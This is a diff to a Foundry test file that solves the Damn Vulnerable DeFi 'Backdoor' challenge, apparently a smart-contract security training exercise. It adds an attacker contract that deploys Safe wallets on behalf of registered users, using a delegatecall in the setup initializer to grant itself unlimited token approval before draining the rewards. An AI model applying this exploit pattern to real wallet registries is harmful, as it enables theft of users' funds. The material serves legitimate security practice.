@@ -7,6 +7,8 @@ import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +72,15 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        BackdoorAttacker attacker = new BackdoorAttacker(
+            address(walletFactory),
+            payable(address(singletonCopy)),
+            address(walletRegistry),
+            address(token),
+            recovery
+        );
+
+        attacker.attack(users);
     }
 
     /**
@@ -92,5 +102,65 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract BackdoorAttacker {
+    SafeProxyFactory factory;
+    Safe singleton;
+    WalletRegistry registry;
+    DamnValuableToken token;
+    address recovery;
+
+    constructor(
+        address _factory,
+        address payable _singleton,
+        address _registry,
+        address _token,
+        address _recovery
+    ) {
+        factory = SafeProxyFactory(_factory);
+        singleton = Safe(_singleton);
+        registry = WalletRegistry(_registry);
+        token = DamnValuableToken(_token);
+        recovery = _recovery;
+    }
+
+    function attack(address[] memory users) external {
+        for (uint256 i = 0; i < users.length; i++) {
+            address user = users[i];
+
+            address[] memory owners = new address[](1);
+            owners[0] = user;
+
+            bytes memory initializer = abi.encodeWithSelector(
+                Safe.setup.selector,
+                owners,
+                1,
+                address(this),
+                abi.encodeWithSignature(
+                    "approveToken(address,address)",
+                    address(token),
+                    address(this)
+                ),
+                address(0),
+                address(0),
+                0,
+                payable(address(0))
+            );
+
+            SafeProxy proxy = factory.createProxyWithCallback(
+                address(singleton),
+                initializer,
+                0,
+                registry
+            );
+
+            token.transferFrom(address(proxy), recovery, 10e18);
+        }
+    }
+
+    function approveToken(address tokenAddr, address spender) external {
+        IERC20(tokenAddr).approve(spender, type(uint256).max);
     }
 }
